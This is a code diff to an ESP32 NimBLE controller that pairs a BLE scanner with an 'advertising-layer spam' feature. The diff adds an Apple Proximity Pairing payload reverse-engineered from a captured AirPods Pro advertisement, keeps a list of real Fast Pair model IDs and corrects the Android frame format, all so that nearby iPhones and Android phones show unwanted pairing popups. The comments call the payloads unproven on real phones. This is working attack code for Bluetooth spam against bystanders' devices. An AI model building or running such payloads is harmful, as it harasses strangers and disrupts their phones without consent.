@@ -3,14 +3,14 @@
  * @brief NimBLE bring-up, passive GAP scanning with fingerprinting, and
  * advertising-layer spam.
  *
- * Spam payload bytes for the Apple Continuity "Nearby Action" message
- * (type 0x10) and the Google Fast Pair service-data record follow the
- * publicly documented AD structure for each protocol, but the specific
- * action-type/model-ID values that make a given phone show a specific
- * popup are best-effort from public write-ups, not from Apple/Google specs
- * — like PMKID capture before hardware-testing found a supporting target,
- * treat this as mechanically-correct-but-unproven until confirmed against
- * a real device (see DEVLOG.md).
+ * The Apple spam payload (Continuity "Proximity Pairing", type 0x07) is
+ * reverse-engineered from a live capture of a real AirPods Pro
+ * advertisement via this component's own blescan, not from a spec — see
+ * build_apple_payload() and DEVLOG.md. The Android payload's frame format
+ * (Fast Pair service data under UUID 0xFE2C) is likewise capture-confirmed;
+ * its 3-byte model IDs are still best-effort guesses from public write-ups.
+ * Whether either actually produces a popup on a real phone is unconfirmed —
+ * treat as mechanically-correct-but-unproven until tested (see DEVLOG.md).
  */
 #include "ble_controller.h"
 
@@ -155,6 +155,12 @@ static int gap_event_handler(struct ble_gap_event *event, void *arg) {
         dev->mfg_data_len = len;
     }
 
+    if (fields.svc_data_uuid16 != NULL && fields.svc_data_uuid16_len > 0) {
+        uint8_t len = fields.svc_data_uuid16_len < sizeof(dev->svc_data) ? fields.svc_data_uuid16_len : sizeof(dev->svc_data);
+        memcpy(dev->svc_data, fields.svc_data_uuid16, len);
+        dev->svc_data_len = len;
+    }
+
     return 0;
 }
 
@@ -211,40 +217,37 @@ void ble_controller_clear_devices(void) {
 
 // --- spam ---
 
-// Publicly documented Apple Continuity "Nearby Action" action-type bytes
-// that are known to trigger a full-screen popup on nearby iOS devices.
-static const uint8_t apple_action_types[] = {
-    0x01, // Apple TV Setup
-    0x06, // Setup New Device
-    0x09, // HomePod Setup
-    0x0B, // Join This AppleID
-    0x13, // Pair (AirPods-style "Would you like to pair" sheet)
-    0x1E, // Apple TV Pair
-    0x20, // Setup New AppleTV
-};
-
-// Fast Pair "not discoverable" advertisement is just the 3-byte model ID as
-// service data under UUID 0xFE2C; these are a handful of real, publicly
-// registered model IDs pulled from open BLE-spam references.
+// Fast Pair "not discoverable" advertisement's 3-byte model ID; these are a
+// handful of real, publicly registered model IDs pulled from open BLE-spam
+// references — unlike the frame format below, still unverified against a
+// live capture (see DEVLOG.md).
 static const uint8_t fastpair_model_ids[][3] = {
     {0x00, 0x00, 0xC3},
     {0x82, 0x92, 0x06},
     {0x71, 0xF1, 0x38},
 };
 
+// Apple Continuity "Proximity Pairing" (type 0x07) — the AirPods-style
+// "Would you like to pair?" popup. This exact structure, not a guess, was
+// reverse-engineered from a live-captured real AirPods Pro advertisement
+// (`blescan`/`bledevices`, see DEVLOG.md): the prefix/model/status template
+// bytes below are what that device broadcast twice, unchanged; only the
+// trailing 16 bytes (confirmed to change every broadcast on the real
+// device) are randomized here. That capture also had no Flags AD at all —
+// just a bare 31-byte manufacturer-data-only advertisement, which this
+// reproduces instead of prepending a flags AD like build_android_payload does.
 static int build_apple_payload(uint8_t *buf) {
-    uint8_t action = apple_action_types[esp_random() % (sizeof(apple_action_types) / sizeof(apple_action_types[0]))];
-    uint8_t len = 0;
-
-    buf[len++] = 0x02; buf[len++] = 0x01; buf[len++] = 0x06; // flags: LE general discoverable, no BR/EDR
-
     uint8_t mfg_payload[] = {
-        0x4C, 0x00,             // Apple company ID (LE)
-        0x10, 0x05,             // Continuity type 0x10 (Nearby Action), length 5
-        0x00,                   // action flags
-        action,                 // action type -> determines which popup shows
-        (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(), // auth tag (opaque)
+        0x4C, 0x00,                         // Apple company ID (LE)
+        0x07, 0x19,                         // type 0x07 Proximity Pairing, length 25
+        0x01, 0x0E, 0x20,                   // prefix + device model (AirPods Pro)
+        0x0B, 0x98, 0x8F, 0x01, 0x00, 0x05, // status/battery template (from capture)
+        (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(),
+        (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(),
+        (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(),
+        (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(),
     };
+    uint8_t len = 0;
     buf[len++] = sizeof(mfg_payload) + 1;
     buf[len++] = 0xFF; // AD type: Manufacturer Specific Data
     memcpy(&buf[len], mfg_payload, sizeof(mfg_payload));
@@ -261,6 +264,9 @@ static int build_android_payload(uint8_t *buf) {
 
     uint8_t svc_payload[] = {
         0x2C, 0xFE, // Fast Pair service UUID 0xFE2C (LE)
+        0x00,       // field header (length/type nibbles) confirmed present before the
+                    // model ID in every live-captured real Fast Pair frame; this
+                    // component's earlier version omitted it entirely
         model_id[0], model_id[1], model_id[2],
     };
     buf[len++] = sizeof(svc_payload) + 1;
